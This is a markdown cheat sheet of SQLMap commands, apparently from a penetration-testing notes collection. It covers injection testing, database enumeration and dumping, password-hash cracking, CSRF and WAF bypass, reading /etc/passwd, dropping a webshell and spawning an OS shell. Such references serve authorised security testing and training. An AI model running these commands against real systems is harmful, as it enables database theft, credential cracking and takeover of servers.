# SQLMap

## Help & Basics

| Command | Description |
|---|---|
| `sqlmap -h` | Basic help menu |
| `sqlmap -hh` | Advanced help menu |
| `sqlmap -u "<URL>?id=1" --batch` | Run non-interactively (auto-accept defaults) |
| `sqlmap 'http://target.com/' --data 'uid=1&name=test'` | Test a POST request |
| `sqlmap 'http://target.com/' --data 'uid=1*&name=test'` | Mark a specific injection point with `*` |
| `sqlmap -r req.txt` | Feed SQLMap a raw captured HTTP request file |
| `sqlmap ... --cookie='PHPSESSID=<VALUE>'` | Specify a session cookie |
| `sqlmap -u <URL> --data='id=1' --method PUT` | Test a PUT request |

## Tuning & Debugging

| Command | Description |
|---|---|
| `sqlmap -u "<URL>?id=1" --batch -t /tmp/traffic.txt` | Log full HTTP traffic to a file |
| `sqlmap -u "<URL>?id=1" -v 6 --batch` | Set verbosity (0–6) |
| `sqlmap -u "<URL>?q=test" --prefix="%'))" --suffix="-- -"` | Manually specify injection prefix/suffix |
| `sqlmap -u "<URL>?id=1" -v 3 --level=5` | Increase test level/risk for deeper coverage |
| `sqlmap --list-tampers` | List all available WAF-bypass tamper scripts |

## Enumeration

| Command | Description |
|---|---|
| `sqlmap -u "<URL>?id=1" --banner --current-user --current-db --is-dba` | Basic DB fingerprint + privilege check |
| `sqlmap -u "<URL>?id=1" --tables -D <DB>` | Enumerate tables in a database |
| `sqlmap -u "<URL>?id=1" --dump -T users -D <DB> -C name,surname` | Dump specific columns from a table |
| `sqlmap -u "<URL>?id=1" --dump -T users -D <DB> --where="name LIKE 'f%'"` | Conditional row dump |
| `sqlmap -u "<URL>?id=1" --schema` | Full database schema enumeration |
| `sqlmap -u "<URL>?id=1" --search -T user` | Search for tables/columns matching a keyword |
| `sqlmap -u "<URL>?id=1" --passwords --batch` | Enumerate and attempt to crack password hashes |

## Bypasses

```bash
sqlmap -u "http://target.com/" --data="id=1&csrf-token=<TOKEN>" --csrf-token="csrf-token"
```
Anti-CSRF token handling — SQLMap re-fetches and substitutes a fresh token per request.

## File System & OS Access

| Command | Description |
|---|---|
| `sqlmap -u "<URL>?id=1" --is-dba` | Check for DBA-level privileges (needed for the below) |
| `sqlmap -u "<URL>?id=1" --file-read "/etc/passwd"` | Read an arbitrary local file |
| `sqlmap -u "<URL>?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Write a file (webshell drop) |
| `sqlmap -u "<URL>?id=1" --os-shell` | Attempt to spawn an interactive OS shell |

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README.md) collection.*

</div>
